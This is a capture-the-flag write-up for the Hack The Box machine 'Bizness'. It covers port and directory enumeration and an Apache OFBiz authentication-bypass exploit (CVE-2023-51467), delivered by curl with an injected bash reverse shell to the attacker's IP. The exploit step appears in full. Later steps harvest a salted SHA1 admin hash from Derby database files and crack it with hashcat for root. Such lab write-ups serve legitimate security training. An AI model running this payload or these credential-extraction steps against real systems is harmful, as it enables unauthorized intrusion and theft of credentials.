---
author: pl4int3xt
layout: post
title: Bizness
date: '2024-01-12'
description: "Bizness is an easy linux machine from HTB"
categories: [HTB]
---

## MACHINE INFO

> **[Bizness](https://app.hackthebox.com/machines/Bizness)** is an easy linux machine which leverages a CVE on `Apache OFBiz` to gain the initial foothold. To escalate privileges we search for hashes in derby db files and decrypt them to get the root password. 

## Enumeration

We perform a quick scan to see the open ports

```shell
sudo nmap -p- --min-rate 10000 10.10.11.252
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 20:03 EAT
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.83s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
34603/tcp open  unknown
```

We then perform an agressive scan on the found open ports

```shell
sudo nmap -A -p 22,80,443,34603 10.10.11.252
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.72s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: BizNess Incorporated
34603/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   706.41 ms 10.10.16.1
2   297.16 ms bizness.htb (10.10.11.252)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.93 seconds
```

We add the ip to our hosts file 
```bash
echo '10.10.11.252 bizness.htb' | sudo tee -a /etc/hosts
```

The website does not have much information 

![img-description](/img/bizness/1.png)

Let's try more enumeration on the directories

```shell
pl4int3xt@archlinux ~> ffuf -w ~/Downloads/wordlists/seclists/directory-list-2.3-small.txt:FUZZ -u https://bizness.htb/FUZZ -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/FUZZ
 :: Wordlist         : FUZZ: /home/pl4int3xt/Downloads/wordlists/seclists/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 3322ms]
```

We get a directory named control let's continue and enumerate the control directory

```shell
pl4int3xt@archlinux ~> ffuf -w ~/Downloads/wordlists/seclists/directory-list-2.3-small.txt:FUZZ -u https://bizness.htb/control/FUZZ -fw 10468

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/control/FUZZ
 :: Wordlist         : FUZZ: /home/pl4int3xt/Downloads/wordlists/seclists/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10468
________________________________________________

login                   [Status: 200, Size: 11060, Words: 1236, Lines: 186, Duration: 5932ms]
help                    [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 5426ms]
main                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 3464ms]
view                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 3551ms]
logout                  [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 618ms]
views                   [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 3998ms]
```

We get a login page which is running apache ofbiz and the release is 18.12 which has a command injection vulnerability [CVE-2023-51467](https://vulncheck.com/blog/ofbiz-cve-2023-51467)

![img-description](/img/bizness/2.png)

we craft our payload to get a reverse shell as stated in this [Article]((https://vulncheck.com/blog/ofbiz-cve-2023-51467))

```shell
curl -kv -H "Host: bizness.htb" -d "groovyProgram=x=new String[3];x[0]='bash';x[1]='-c';x[2]='bash -i >%26 /dev/tcp/10.10.16.59/9001 0>%261;';x.execute();" "https://bizness.htb/webtools/control/ProgramExport/?requirePasswordChange=Y&PASSWORD=lobster&USERNAME=albino"
```

Running the curl request we gain the initial foothold 

```shell
pl4int3xt@archlinux ~> nc -nlvp 9001
Connection from 10.10.11.252:43578
bash: cannot set terminal process group (719): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$
```

After running linpeas we get some interesting derby database files 

```
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log
/var/log/journal/5e1bbbd9ec5d475ca2f8372a972bd975/user-1001.journal
/var/log/journal/5e1bbbd9ec5d475ca2f8372a972bd975/system.journal
/var/log/syslog
/var/log/daemon.log
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6850.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cde61.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c2e1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c14ad1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cde51.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cce71.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6861.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cce61.dat
/opt/ofbiz/runtime/data/derby/ofbiz/log/log32.dat
/opt/ofbiz/runtime/logs/error.log
/opt/ofbiz/runtime/logs/access_log..2024-01-12
/opt/ofbiz/runtime/logs/ofbiz.log
/tmp/hsperfdata_ofbiz/719
/tmp/hsperfdata_ofbiz/554
/tmp/hsperfdata_ofbiz/849
```

We search for all .dat files and compile them together

```shell
find / -name '*.dat' -type f 2>/dev/null > /tmp/datfiles
```

Searching for SHA strings in the compiled file we come across this

```shell
ofbiz@bizness:/tmp$ cat datfiles | xargs strings | grep SHA
cat datfiles | xargs strings | grep SHA
strings: /var/cache/debconf/passwords.dat: Permission denied
SHAREHOLDER
SHAREHOLDER
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
SHA-256
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
MARSHALL ISLANDS
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I!! 
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I!! 
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
SHA-256
SHA-256
```
We have a sha1 salted hash

> The $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I contains 3 parts
> * $SHA = shows this is SHA1 hash
> * $d = this is the salt value
> * $uP0_QaVBpDWFeo8-dRzDqRwXQ2I = bas64 encoded hash value

To crack this with hashcat we first need to decode it and convert it to hex. Let's do that with cyberchef

![img-description](/img/bizness/3.png)

```
cat hash
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```
Now let's crack the hash
```
hashcat -m 110 -a 0 hash /usr/share/wordlists/rockyou.txt
```
cracking the hash we get a password and we successfully login to root.

![img-description](/img/bizness/4.png)